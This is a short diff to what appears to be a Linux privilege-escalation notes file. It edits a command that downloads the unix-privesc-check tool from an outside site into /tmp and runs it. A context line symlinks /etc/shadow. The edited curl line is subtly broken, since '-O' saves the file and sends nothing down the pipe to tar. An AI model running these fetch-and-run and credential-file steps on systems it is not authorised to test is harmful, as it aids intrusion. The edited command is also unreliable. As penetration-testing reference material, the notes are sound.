@@ -109,7 +109,7 @@ ln -s /etc/shadow sh-link
 
 Here we download and run a basic Linux config auditor to see if it finds any obvious opportunities. 
 ``` bash
-cd /tmp; curl http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
+cd /tmp; curl -OL http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
 ```
 
 Is it a container? 
